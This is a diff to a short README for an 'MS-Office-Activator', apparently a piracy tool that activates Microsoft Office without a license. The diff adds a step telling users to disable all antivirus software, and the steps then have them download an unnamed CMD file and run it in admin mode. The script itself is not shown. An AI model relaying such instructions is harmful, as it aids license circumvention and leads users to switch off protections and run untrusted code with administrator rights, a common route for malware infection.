@@ -1,8 +1,9 @@
 # MS-Office-Activator:
 
-Step 1: Download the CMD file. <br>
-Step 2: Run the cmd file in admin mode.  <br>
-Step 3: Check the activation status again. <br>
+Step 1: Deactivate all antivirus software. <br>
+Step 2: Download the CMD file. <br>
+Step 3: Run the cmd file in admin mode.  <br>
+Step 4: Check the activation status again. <br>
 
 Done! Your product is activated successfully now.
 
